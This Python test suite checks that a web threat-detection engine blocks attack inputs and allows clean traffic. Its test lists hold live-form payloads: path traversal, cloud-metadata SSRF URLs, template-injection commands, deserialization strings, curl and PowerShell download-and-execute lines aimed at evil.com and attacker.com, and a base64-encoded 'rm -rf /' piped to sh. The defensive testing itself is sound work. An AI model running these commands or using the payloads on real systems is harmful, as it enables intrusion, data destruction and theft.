"""
SentinelGrid - Comprehensive Threat Detection & CVE Regression Test Suite
Executes all attack payloads across SQLi, XSS, Path Traversal, SSRF, RCE, and CVEs.
"""

import sys
import json
import unittest
from pathlib import Path

# Add backend directory to sys.path
sys.path.insert(0, "/run/media/anup/D/sentinelgrid/backend")

from app.security_engine.brain import SecurityBrain
from app.security_engine.normalization.normalizer import RequestNormalizer


class TestSecurityBrainComprehensive(unittest.TestCase):

    def test_request_normalizer_bypasses(self):
        """Verifies normalizer unescapes double-encoded, null-byte, and homoglyph attacks."""
        raw_traversal = "%252e%252e%252f%252e%252e%252fetc%2fpasswd%00"
        norm = RequestNormalizer.normalize_string(raw_traversal)
        self.assertIn("../../etc/passwd", norm)
        self.assertNotIn("%00", norm)
        self.assertNotIn("\x00", norm)

    def test_sqli_payload_fixtures(self):
        """Tests SQL injection sample fixtures."""
        fixture_path = Path("/run/media/anup/D/sentinelgrid/shared/test-fixtures/sqli-samples.json")
        with open(fixture_path, "r") as f:
            data = json.load(f)

        for sample in data["samples"]:
            payload = sample["payload"]
            target = sample.get("target", "query")

            res = SecurityBrain.evaluate(
                path=payload if target == "path" else "/api/v1/search",
                method="GET",
                query=payload if target == "query" else "",
                body=payload if target == "body" else "",
                headers={"user-agent": "Mozilla/5.0"}
            )
            self.assertEqual(res["action"], "BLOCK", f"Failed to block SQLi sample: {sample['name']}")
            self.assertTrue(res["risk_score"] >= 80.0)

    def test_xss_payload_fixtures(self):
        """Tests Cross-Site Scripting sample fixtures."""
        fixture_path = Path("/run/media/anup/D/sentinelgrid/shared/test-fixtures/xss-samples.json")
        with open(fixture_path, "r") as f:
            data = json.load(f)

        for sample in data["samples"]:
            payload = sample["payload"]
            res = SecurityBrain.evaluate(
                path="/profile",
                method="POST",
                query="",
                body=payload,
                headers={"user-agent": "Mozilla/5.0"}
            )
            self.assertEqual(res["action"], "BLOCK", f"Failed to block XSS sample: {sample['name']}")

    def test_path_traversal_fixtures(self):
        """Tests Path Traversal and LFI sample fixtures."""
        fixture_path = Path("/run/media/anup/D/sentinelgrid/shared/test-fixtures/traversal-samples.json")
        with open(fixture_path, "r") as f:
            data = json.load(f)

        for sample in data["samples"]:
            payload = sample["payload"]
            target = sample.get("target", "path")
            res = SecurityBrain.evaluate(
                path=payload if target == "path" else "/download",
                method="GET",
                query=payload if target == "query" else "",
                body="",
                headers={"user-agent": "Mozilla/5.0"}
            )
            self.assertEqual(res["action"], "BLOCK", f"Failed to block Traversal sample: {sample['name']}")

    def test_cve_and_rce_payload_fixtures(self):
        """Tests Log4Shell, Spring4Shell, SSRF, XXE, and RCE fixtures."""
        fixture_path = Path("/run/media/anup/D/sentinelgrid/shared/test-fixtures/cve-rce-ssrf-samples.json")
        with open(fixture_path, "r") as f:
            data = json.load(f)

        for sample in data["samples"]:
            payload = sample["payload"]
            target = sample.get("target", "query")

            headers = {"user-agent": "Mozilla/5.0"}
            if target == "headers":
                headers["x-forwarded-for"] = payload
                headers["custom-header"] = payload

            res = SecurityBrain.evaluate(
                path="/api/endpoint",
                method="POST",
                query=payload if target == "query" else "",
                body=payload if target == "body" else "",
                headers=headers
            )
            self.assertEqual(res["action"], "BLOCK", f"Failed to block CVE sample: {sample['name']}")
            self.assertTrue(res["risk_score"] >= 80.0)

    def test_legitimate_traffic_passes(self):
        """Verifies normal, legitimate API calls are allowed and not falsely blocked."""
        clean_requests = [
            {"path": "/api/v1/tours/search", "query": "location=Kyoto&days=5", "body": "", "headers": {}},
            {"path": "/api/v1/users/profile", "query": "", "body": json.dumps({"name": "Alice Smith", "email": "alice@example.com"}), "headers": {}},
            {"path": "/products/artisan-vase-102", "query": "currency=USD", "body": "", "headers": {}},
            {"path": "/api/v1/items", "query": "id=123", "body": "", "headers": {}},
            {"path": "/api/v1/catalog", "query": "filter=active AND sort=asc", "body": "", "headers": {}},
            {"path": "/api/v1/cart", "query": "user_id=456", "body": "", "headers": {"cookie": "session=xyz123; cat=books"}}
        ]

        for req in clean_requests:
            headers = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0 Safari/537.36"}
            headers.update(req.get("headers", {}))
            res = SecurityBrain.evaluate(
                path=req["path"],
                method="GET",
                query=req["query"],
                body=req["body"],
                headers=headers
            )
            self.assertEqual(res["action"], "ALLOW", f"Legitimate request falsely blocked: {req['path']} query={req['query']}")
            self.assertEqual(res["risk_score"], 0.0, f"Expected 0.0 risk score for clean request: {req}")
            self.assertTrue(res["is_clean"])

    def test_advanced_ssrf_detection(self):
        """Tests AWS/GCP/Azure IMDS SSRF endpoints across decimal, hex, and standard encodings."""
        ssrf_payloads = [
            ("AWS IMDS Dotted Decimal", "http://169.254.169.254/latest/meta-data/"),
            ("AWS IMDS Hex Dword", "http://0xa9fea9fe/latest/meta-data/"),
            ("AWS IMDS Decimal Dword", "http://2852039166/latest/meta-data/"),
            ("AWS IMDS Dotted Hex", "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/"),
            ("AWS IMDS Octal Dword", "http://025177524776/latest/meta-data/"),
            ("AWS IMDSv2 Token Request", "http://169.254.169.254/latest/api/token"),
            ("AWS IPv6 IMDS", "http://[fd00:ec2::254]/latest/meta-data/"),
            ("GCP Metadata Internal", "http://metadata.google.internal/computeMetadata/v1/"),
            ("Azure Metadata Endpoint", "http://metadata.azure.com/metadata/instance?api-version=2021-02-01"),
            ("Azure Metadata Path", "http://169.254.169.254/metadata/instance"),
        ]

        for name, payload in ssrf_payloads:
            # Test in query parameter
            res_query = SecurityBrain.evaluate(
                path="/api/proxy",
                method="GET",
                query=f"target_url={payload}",
                body="",
                headers={"user-agent": "Mozilla/5.0"}
            )
            self.assertEqual(res_query["action"], "BLOCK", f"Failed to block SSRF in query: {name}")
            self.assertTrue(res_query["risk_score"] >= 90.0)

            # Test in request body
            res_body = SecurityBrain.evaluate(
                path="/api/fetch",
                method="POST",
                query="",
                body=json.dumps({"url": payload}),
                headers={"user-agent": "Mozilla/5.0"}
            )
            self.assertEqual(res_body["action"], "BLOCK", f"Failed to block SSRF in body: {name}")
            self.assertTrue(res_body["risk_score"] >= 90.0)

    def test_ssti_detection(self):
        """Tests Server-Side Template Injection (Jinja2, Twig, Freemarker, SpEL, ERB)."""
        ssti_payloads = [
            ("Jinja2 / Twig Math", "{{7*7}}"),
            ("Jinja2 Spaced Math", "{{ 7 * 7 }}"),
            ("Spring SpEL Math", "${7*7}"),
            ("OGNL / Struts Hash Math", "#{7*7}"),
            ("Ruby ERB / JSP Tag", "<%= 7*7 %>"),
            ("Ruby ERB Spaced", "<%= 7 * 7 %>"),
            ("Jinja2 MRO Exploit", "{{ ''.__class__.__mro__[1].__subclasses__() }}"),
            ("Jinja2 Config Introspection", "{{ config.items() }}"),
            ("Spring SpEL Runtime Exec", "${T(java.lang.Runtime).getRuntime().exec('whoami')}"),
            ("Freemarker Execute Assign", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"),
        ]

        for name, payload in ssti_payloads:
            # Query param test
            res_query = SecurityBrain.evaluate(
                path="/search",
                method="GET",
                query=f"template={payload}",
                body="",
                headers={"user-agent": "Mozilla/5.0"}
            )
            self.assertEqual(res_query["action"], "BLOCK", f"Failed to block SSTI in query: {name}")
            self.assertTrue(res_query["risk_score"] >= 90.0)

            # JSON Body test
            res_body = SecurityBrain.evaluate(
                path="/render",
                method="POST",
                query="",
                body=json.dumps({"template_str": payload}),
                headers={"user-agent": "Mozilla/5.0"}
            )
            self.assertEqual(res_body["action"], "BLOCK", f"Failed to block SSTI in body: {name}")
            self.assertTrue(res_body["risk_score"] >= 90.0)

    def test_advanced_rce_detection(self):
        """Tests advanced command execution, base64 pipes, one-liners, and PowerShell download cradles."""
        rce_payloads = [
            ("Base64 Pipe to sh", "echo 'cm0gLXJmIC8=' | base64 -d | sh"),
            ("Base64 Pipe to bash", "; cat /tmp/secret | base64 -d | bash"),
            ("Base64 Decode to dash", "| base64 --decode | /bin/sh"),
            ("cURL Pipe to Shell", "curl http://attacker.com/mal.sh | bash"),
            ("Python3 One-Liner", "python3 -c \"import os; os.system('whoami')\""),
            ("Python One-Liner", "python -c 'import socket,subprocess; s=socket.socket();'"),
            ("Perl One-Liner", "perl -e 'exec \"/bin/sh\";'"),
            ("PowerShell Invoke-WebRequest", "powershell -Command \"Invoke-WebRequest -Uri http://evil.com/x.exe -OutFile C:\\x.exe\""),
            ("PowerShell iwr to IEX", "powershell iwr http://evil.com/p.ps1 | iex"),
            ("PowerShell Net.WebClient Cradle", "powershell (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1') | iex"),
            ("PowerShell Encoded Command", "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Enc aQB3AHIA..."),
            ("Invoke-Expression Net.WebClient", "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/x.ps1')"),
        ]

        for name, payload in rce_payloads:
            res = SecurityBrain.evaluate(
                path="/api/v1/system",
                method="POST",
                query=f"cmd={payload}",
                body=payload,
                headers={"user-agent": "Mozilla/5.0"}
            )
            self.assertEqual(res["action"], "BLOCK", f"Failed to block Advanced RCE: {name}")
            self.assertTrue(res["risk_score"] >= 90.0)

    def test_modern_security_scanners_detection(self):
        """Tests detection of modern vulnerability scanners in User-Agent header."""
        scanner_uas = [
            ("Nuclei Scanner", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"),
            ("FFUF Fuzzer", "ffuf/2.0.0-git"),
            ("Gobuster Directory Buster", "gobuster/3.6"),
            ("Feroxbuster Recursive Scanner", "feroxbuster/2.10.0"),
            ("Nikto Web Scanner", "Nikto/2.1.6"),
            ("SqlMap Exploitation Tool", "sqlmap/1.7#stable"),
            ("OWASP ZAP Proxy", "OWASP ZAP 2.14.0"),
            ("ZAP Version Header", "ZAP/2.12.0"),
            ("Acunetix Scanner", "Mozilla/5.0 (compatible; Acunetix Web Vulnerability Scanner)"),
            ("Qualys WAS Scanner", "Mozilla/5.0 (compatible; QualysGuard WAS Scanner)"),
        ]

        for name, ua in scanner_uas:
            res = SecurityBrain.evaluate(
                path="/api/v1/health",
                method="GET",
                query="",
                body="",
                headers={"user-agent": ua}
            )
            self.assertEqual(res["action"], "BLOCK", f"Failed to block Scanner: {name}")
            self.assertEqual(res["top_match"]["rule_id"], "SCANNER-KNOWN-TOOL-SIGNATURE")
            self.assertTrue(res["risk_score"] >= 95.0)

    def test_deserialization_attacks(self):
        """Tests Java serialized magic bytes and PHP object injection."""
        deser_payloads = [
            ("Java Serialized Base64", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA..."),
            ("Java Serialized Hex Magic Bytes", "aced00050005737200"),
            ("PHP Object Injection", "O:8:\"Exploit\":1:{s:4:\"code\";s:10:\"phpinfo();\";}"),
            ("PHP Object Injection Plus Bypass", "O:+8:\"Exploit\":1:{s:4:\"code\";s:10:\"phpinfo();\";}"),
            ("PHP Custom Serializable Class", "C:11:\"ArrayObject\":0:{}"),
        ]

        for name, payload in deser_payloads:
            res = SecurityBrain.evaluate(
                path="/api/v1/data",
                method="POST",
                query=f"data={payload}",
                body=payload,
                headers={"user-agent": "Mozilla/5.0"}
            )
            self.assertEqual(res["action"], "BLOCK", f"Failed to block Deserialization attack: {name}")
            self.assertTrue(res["risk_score"] >= 85.0)

    def test_zero_false_positives_extensive_aegis(self):
        """Extensively verifies legitimate traffic, cookies, JSON bodies, and AEGIS-PRO requests."""
        legitimate_requests = [
            # Standard Query Parameters
            {"path": "/api/v1/tours/search", "query": "location=Kyoto&days=5&sort=price_asc", "body": "", "headers": {}},
            {"path": "/api/v1/catalog", "query": "filter=active AND sort=asc&page=2&limit=50", "body": "", "headers": {}},
            {"path": "/products/artisan-vase-102", "query": "currency=USD&region=US-WEST", "body": "", "headers": {}},
            {"path": "/api/v1/items", "query": "id=123&category=books&tag=cybersecurity", "body": "", "headers": {}},
            {"path": "/search", "query": "q=network+security+fundamentals+101", "body": "", "headers": {}},

            # Cookies with semicolons
            {"path": "/api/v1/cart", "query": "user_id=456", "body": "", "headers": {"cookie": "session=xyz123; cat=books; theme=dark; token=abc_999"}},
            {"path": "/api/v1/account", "query": "", "body": "", "headers": {"cookie": "auth_token=eyJhbGciOi...; lang=en-US; _ga=GA1.2.12345678.12345678"}},

            # JSON bodies with text, arithmetic expressions in text, and punctuation
            {"path": "/api/v1/users/profile", "query": "", "body": json.dumps({"name": "Alice Smith", "email": "alice@example.com", "bio": "Security enthusiast"}), "headers": {}},
            {"path": "/api/v1/feedback", "query": "", "body": json.dumps({"comment": "Loved the 7*7 inch photo frame! 10/10 quality.", "rating": 5}), "headers": {}},
            {"path": "/api/v1/notes", "query": "", "body": json.dumps({"title": "Math lesson", "content": "Notice that 7*7=49 and 8*8=64"}), "headers": {}},
            {"path": "/api/v1/checkout", "query": "", "body": json.dumps({"items": [{"id": 1, "qty": 2, "price": 19.99}], "coupon": "SUMMER$50"}), "headers": {}},

            # AEGIS-PRO Origin Application Traffic
            {"path": "/index.html", "query": "", "body": "", "headers": {}},
            {"path": "/dashboard.html", "query": "track=soc-analyst", "body": "", "headers": {}},
            {"path": "/style.css", "query": "v=2.1.0", "body": "", "headers": {}},
            {"path": "/app.js", "query": "", "body": "", "headers": {}},
            {"path": "/tracks-data.js", "query": "", "body": "", "headers": {}},
            {"path": "/resources-data.js", "query": "", "body": "", "headers": {}},
            {"path": "/firebase-auth.js", "query": "", "body": "", "headers": {}},
            {"path": "/register.html", "query": "", "body": "", "headers": {}},
            {"path": "/forgot-password.html", "query": "", "body": "", "headers": {}},
            {"path": "/privacy.html", "query": "", "body": "", "headers": {}},
            {"path": "/terms.html", "query": "", "body": "", "headers": {}},
            {"path": "/api/login", "query": "", "body": json.dumps({"email": "student@university.edu", "password": "SecurePassword123!"}), "headers": {}},
            {"path": "/api/register", "query": "", "body": json.dumps({"name": "Bob Vance", "email": "bob@corp.internal", "track": "web-security"}), "headers": {}},
            {"path": "/api/contact", "query": "", "body": json.dumps({"name": "Alex Johnson", "email": "alex@corp.com", "message": "I really enjoyed lesson 4.2 on Incident Response! Could you add more Wireshark labs?"}), "headers": {}},
            {"path": "/api/track-progress", "query": "", "body": json.dumps({"track_id": "defensive-operations", "module": 3, "score": 95.5}), "headers": {}},
        ]

        for req in legitimate_requests:
            headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
            headers.update(req.get("headers", {}))
            res = SecurityBrain.evaluate(
                path=req["path"],
                method="POST" if req["body"] else "GET",
                query=req["query"],
                body=req["body"],
                headers=headers
            )
            self.assertEqual(res["action"], "ALLOW", f"Legitimate request falsely blocked: {req['path']} query={req['query']} body={req['body']}")
            self.assertEqual(res["risk_score"], 0.0, f"Expected 0.0 risk score for clean request: {req}")
            self.assertTrue(res["is_clean"], f"Expected is_clean=True for: {req}")


if __name__ == "__main__":
    unittest.main()
